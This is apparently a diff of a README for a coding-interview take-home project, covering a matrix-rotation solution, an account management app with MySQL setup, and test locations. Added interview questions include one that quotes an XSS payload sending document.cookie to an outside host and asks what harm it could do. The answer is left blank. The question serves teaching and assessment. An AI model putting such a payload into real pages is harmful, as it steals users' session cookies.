@@ -15,7 +15,8 @@ Contact : sunnysidesounds@gmail.com / 415-690-3590
     * 1 hours to solve, test, refactor, revise
 
 * Tests:
-    * Location: `src/questions1/Questions1.test.js`
+    * Run tests by `yarn react-scripts test`
+    * Location: `src/questions1/Integer.test.js` (unit tests)
 
 ## Question 2: Implementation of _clockwiseMatrix(matrixString)_
 
@@ -30,7 +31,8 @@ Contact : sunnysidesounds@gmail.com / 415-690-3590
     * 2.5 hrs, initially solved, refactored, tests, revise
 
 * Tests:
-    * Location: `src/questions2/Questions2.test.js`
+    * Run tests by `yarn react-scripts test`
+    * Location: `src/questions2/MatrixRotator.test.js` (unit tests)
 
 * Logging:
     * In the MatrixRotator.js line 36 we are console logging this error. A TODO, would to implement some kind of logging library, monitoring, on this error.
@@ -38,28 +40,53 @@ Contact : sunnysidesounds@gmail.com / 415-690-3590
 
 * Question 2a:
     * Question: Given your solution, how would you verify the correctness of your answers?
-    * Answer : I've verified my solutions by doing the following
-        * Initial tests with the provided input/output test data (6 total)
+    * Answer : I've verified my solutions by doing the following testting
+        * Initial tests with the provided input/output test data
         * Tests for the string cleaning and formatting.
         * Matrix string to 2d-array formatting
         * Matrix generation
 
 
-
- * Answer : You could use a combination of unit testing targeted towards method I/O. Also, since there are several directions
-     of traversal (left to right, top to bottom..) You could individual write unit tests for these traversals. Finally you could
-     rebuild the matrix based on the outputted list of integers and the last captured element location when the matrix was disassembled
-     to a list.
-
-
-
-
-
-
 ## Question 3: Simple Account Mangement Service
 
+* Minimum Requirements:
+    * Must have user list view
+    * Must have user new form
+    * Must be able to create, read, update and delete
+
+* Enchanced Feature Requirements:
+    * Improved User Experience and front-end design. Created modals for new, update and delete. This fits with a single page app design.
+    * Full service implementation, in-memory is replaced with Mysql Database, if environment variable USE_MYSQL_DB is set to true.
+        * Setup on mysql database:
+            1. Set environment variables: `../src/question3/scripts/setup_mysql.sh`
+            2. Import the schema and data: `mysql -u root -p account_manager < /src/question2/sql/schema_test_data_setup.sql`
+                * TODO: To setup migration functionality with Knexjs, this would remove step 2
+    * Add searching/filtering functionality to the accounts, the list view have filter by methods for name, email, birthday and balance
+
+* Assumptions:
+    * name and email are required, birthday is not, balance does not?
+
+* Completion Time:
+    * 4 hrs to setup endpoint call, display users in list view and stubbed new, edit and delete onClick events.
+    * 3 hours to add enchanged features. Full service implementation, filtering and UI design improvements.
+
+* Tests:
+    * Run tests by `yarn react-scripts test`
+    * Location: `src/questions3/Accounts/Accounts.test.js` (integration endpoint tests)
+    * Location: `src/questions3/Common/Compare.test.js` (unit tests)
 
 
+## Question 4:
+* Question: What harm could result from the following? `http://www.example.com/search?q=<script>object.src="http://otherexample.com/code?data="+document.cookie</script>`
+* Answer:
+
+## Question 5:
+* Question: Explain what security measures need to be taken into consideration for web applications.
+* Answer:
+
+## Question 6:
+* Question: Please provide us with a link(s) to your portfolio and/or some code samples of your work.
+* Answer:
 
 
 
